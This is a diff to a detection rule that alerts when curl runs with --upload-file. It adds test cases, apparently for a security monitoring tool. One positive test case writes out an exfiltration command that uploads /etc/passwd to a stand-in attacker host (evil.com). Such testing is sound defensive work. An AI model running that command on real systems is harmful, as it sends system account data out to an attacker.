@@ -1,4 +1,16 @@
 name: curl_upload_file
+mode: alert
 eval: e.process_name == "curl" &&
       e.process_args.contains("--upload-file") &&
       e.event_category == "process"
+tests:
+  - cleartext: "curl https://evil.com --upload-file /etc/passwd"
+    process_name: curl
+    process_args: "curl https://evil.com --upload-file /etc/passwd"
+    event_category: process
+    should_match: true
+  - cleartext: "curl https://example.com -o file.html"
+    process_name: curl
+    process_args: "curl https://example.com -o file.html"
+    event_category: process
+    should_match: false
